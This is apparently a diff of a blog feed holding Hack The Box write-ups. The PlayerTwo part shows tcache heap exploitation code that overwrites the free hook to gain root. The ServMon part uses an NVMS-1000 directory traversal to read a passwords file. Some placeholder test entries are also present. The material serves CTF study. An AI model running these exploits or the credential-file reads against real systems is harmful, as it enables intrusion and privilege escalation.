+    &lt;p&gt;In order to leak libc, writeups such as the babyheap defcon challenge &lt;a href=&quot;#2&quot;&gt;[2]&lt;/a&gt; were really helpful to me for more details go there, I’ll sum it up:&lt;br /&gt;
 Each tcache can hold 7 same-size chunks when freed before it puts other freed chunks of this size into the unsorted bin. Thus we need to allocate and then free more than 7 chunks of same size, I went with size 0xf8. If we allocate and free 9 chunks we notice a chunk in the unsorted bin with its fd/bk pointer pointing into libc by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heap bins&lt;/code&gt;:&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
@@ -283,7 +275,7 @@ Each tcache can hold 7 same-size chunks when freed before it puts other freed ch
     &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;# freeing the i-th config
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/unsorted_bin.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/unsorted_bin.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc.
@@ -329,7 +321,7 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# size is that it has to be congruent 8 modulo 16.
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Chunk1.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk1.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc.
@@ -339,7 +331,7 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;/figure&gt;
 
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Chunk2.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk2.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       Illustrating the null byte overwrite.
@@ -357,7 +349,7 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# but also with a size%16=8 
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Chunk3.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk3.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       Game descriptions being adjacent - the setup needed for the double free.
@@ -377,7 +369,7 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Chunk4.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk4.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       Our plan worked - we overwrote the chunk size header from 0x171 to 0x100.
@@ -387,7 +379,7 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;/figure&gt;
 
 &lt;h3 id=&quot;the-double-free&quot;&gt;The double free&lt;/h3&gt;
-&lt;p class=&quot;text-justify&quot;&gt;Now that we were able to set the chunk size header from 0x1XY to 0x100 we can do a double free attack similar to the before mentioned &lt;em&gt;zero_to_hero&lt;/em&gt; challenge &lt;a href=&quot;#[5]&quot;&gt;[5]&lt;/a&gt; with small variations.&lt;br /&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Now that we were able to set the chunk size header from 0x1XY to 0x100 we can do a double free attack similar to the before mentioned &lt;em&gt;zero_to_hero&lt;/em&gt; challenge &lt;a href=&quot;#[1]&quot;&gt;[1]&lt;/a&gt; with small variations.&lt;br /&gt;
 To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in memory) where we want to write our config name to. For the chunks I want to align the descriptions adjacent I chose sizes 0x58 (chunk 9) and 0x180 (chunk 10):&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Dummies
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# Dummies are necessary to get two config _descriptions_ aligned right
@@ -447,7 +439,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/tcache.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/tcache.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       Upper: Chunk 10 inside the 0x190 tcache bin but with size 0x100.&lt;br /&gt; Lower: Two chunks of size 0x100 inside the 0x100 tcache bin but pointing to the same address.
@@ -463,7 +455,6 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
   &lt;li&gt;write the free hook into the first chunk, junk into the second, and the system call into the third.&lt;/li&gt;
   &lt;li&gt;Free chunk 9&lt;/li&gt;
   &lt;li&gt;Become root.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;GGWP - Hell ride’s over&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;complete-script&quot;&gt;Complete Script&lt;/h2&gt;
@@ -584,10 +575,10 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;***********************&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D8C5&lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h1 id=&quot;outtakes&quot;&gt;Outtakes&lt;/h1&gt;
-&lt;h2 id=&quot;root---the-unintended-way&quot;&gt;Root - the unintended way&lt;/h2&gt;
-&lt;p class=&quot;text-justify&quot;&gt;The trivial way of becoming root is to realize that for the ssh key to be sent via MQTT the ssh key from observers home directory is read. Feels like this was on purpose as this could have easily been fixed. Thus replacing the ssh key with a symbolic link to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; will get you the flag.&lt;/p&gt;
-&lt;h2 id=&quot;root---the-different-intended-way&quot;&gt;Root - the different intended way&lt;/h2&gt;
+&lt;h1 id=&quot;appendix&quot;&gt;&lt;a name=&quot;Appendix&quot;&gt;&lt;/a&gt;Appendix&lt;/h1&gt;
+&lt;h2 id=&quot;root---unintended&quot;&gt;Root - unintended&lt;/h2&gt;
+&lt;p class=&quot;text-justify&quot;&gt;The trivial way of becoming root is to realize that for the ssh key to be sent via MQTT the ssh key from observers home directory is read. Feels like this was on purpose as this could have easily been fixed. Thus replacing the private key file with a symbolic link to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; will get you the flag.&lt;/p&gt;
+&lt;h2 id=&quot;root---another-intended-way&quot;&gt;Root - another intended way&lt;/h2&gt;
 &lt;p&gt;Disclaimer: The following is not my work but I have the permission to publish.&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
@@ -679,7 +670,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
     &lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 6,7,8
 &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# 7 chucnks in 0x40 tcache
+&lt;span class=&quot;c1&quot;&gt;# 7 chunks in 0x40 tcache
 # tcache should be filled up now
 &lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# Now its time for the poison null byte. just remember what i said before and you should be fine.
@@ -744,14 +735,191 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
-&lt;p&gt;&lt;a name=&quot;[5]&quot;&gt;[5]&lt;/a&gt; &lt;a href=&quot;https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/&quot;&gt;https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name=&quot;[0]&quot;&gt;[0]&lt;/a&gt; &lt;a href=&quot;https://twitchtv.github.io/twirp/docs/intro.html&quot;&gt;Twirp documentation&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a name=&quot;[6]&quot;&gt;[6]&lt;/a&gt; &lt;a href=&quot;https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/&quot;&gt;https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name=&quot;[1]&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/&quot;&gt;Write-ups which are useful for the box&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a name=&quot;[7]&quot;&gt;[7]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Your Name</name></author><category term="heap" /><category term="binary" /><summary type="html">Overview PlayerTwo is MrR3boot’s follow-up box to his box Player - this time created in collaboration with b14ckh34rt.</summary></entry><entry><title type="html">TEST TEST</title><link href="http://localhost:4000/blog/boxes/template/" rel="alternate" type="text/html" title="TEST TEST" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/blog/boxes/template</id><content type="html" xml:base="http://localhost:4000/blog/boxes/template/">&lt;p&gt;TEST&lt;/p&gt;
+&lt;p&gt;&lt;a name=&quot;[2]&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/&quot;&gt;Another source of useful write-ups&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box PlayerTwo from Hack The Box</summary></entry><entry><title type="html">TEST TEST</title><link href="http://localhost:4000/challenges/template/" rel="alternate" type="text/html" title="TEST TEST" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/challenges/template</id><content type="html" xml:base="http://localhost:4000/challenges/template/">&lt;p&gt;TEST&lt;/p&gt;
 
 &lt;p&gt;TEST
-Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;</content><author><name>Billy Rick</name></author><category term="boxes" /><summary type="html">TEST</summary></entry><entry><title type="html">Another test</title><link href="http://localhost:4000/blog/boxes/asd/" rel="alternate" type="text/html" title="Another test" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/blog/boxes/asd</id><content type="html" xml:base="http://localhost:4000/blog/boxes/asd/">&lt;p&gt;TEST
+Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;</content><author><name>Billy Rick</name></author><category term="challenge" /><summary type="html">TEST</summary></entry><entry><title type="html">HackThebox - ServMon</title><link href="http://localhost:4000/boxes/ServMon/" rel="alternate" type="text/html" title="HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/ServMon</id><content type="html" xml:base="http://localhost:4000/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p class=&quot;text-justify&quot;&gt;This is an interesting box as it has gotten a lot of heat - mostly due to the steps required for root - and I can see why: The web interface might be slowish and buggy under load but also people can mess with each other - pushing the frustration. As this includes overwriting others’ files I think this box teaches what I call &lt;em&gt;gentleman behaviour&lt;/em&gt;. Try to not mess with other peoples stuff when working on the same box.&lt;/p&gt;
+&lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
+&lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan reveals&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5666/tcp open  nrpe
+6699/tcp open  napster
+8443/tcp open  https-alt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Logging into ftp anonymously we find two users &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Users&lt;/code&gt; folder. From Nadine’s folder we get a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Confidential.txt&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Notes to do.txt&lt;/code&gt; from Nathan:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Confidential.txt
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Notes&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;to&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt 
+1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Change the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;NVMS - Complete
+2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Lock down the NSClient Access - Complete
+3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Upload the passwords
+4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Remove public access to NVMS
+5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Place the secret files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;SharePoint
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Not much to continue from. So we are done with ftp, since we have no creds for ssh we go over to the web page and see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt; running and a login prompt. Trying standard passwords does not work but&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit nvms
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+ Exploit Title                                         |  Path
+                                                       | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+NVMS 1000 - Directory Traversal                        | exploits/hardware/webapps/47774.txt
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
+&lt;span class=&quot;c&quot;&gt;# Title: NVMS-1000 - Directory Traversal&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Date: 2019-12-12&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;reveals a relatively new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; vulnerability and combining with the info from the note, we know that there’s a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; file in Nathans Desktop, likely to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Nathan\Desktop\Passwords.txt&lt;/code&gt; - that looks promising. So we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo msfconsole&lt;/code&gt; and search the exploit:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search nvms
+
+Matching Modules
+&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;
+
+   &lt;span class=&quot;c&quot;&gt;#  Name                                       Disclosure Date  Rank    Check  Description&lt;/span&gt;
+   -  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;    &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal
+
+
+msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/http/tvt_nvms_traversal
+msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options
+
+Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name       Current Setting   Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   DEPTH      13                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Depth &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Path Traversal
+   FILEPATH   /windows/win.ini  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The path to the file to &lt;span class=&quot;nb&quot;&gt;read
+   &lt;/span&gt;Proxies                      no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
+   RHOSTS                       &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;We need to set RHOSTS which is the IP of the box 10.10.10.184 and we also notice the FILEPATH &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/windows/win.ini&lt;/code&gt; which is the short form for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt; therefore we&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.10.10.184
+RHOSTS &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.10.184
+msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;FILEPATH /Users/Nathan/Desktop/Passwords.txt
+FILEPATH &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /Users/Nathan/Desktop/Passwords.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and run the exploit&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.184:80 - Downloaded 156 bytes
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File saved &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt
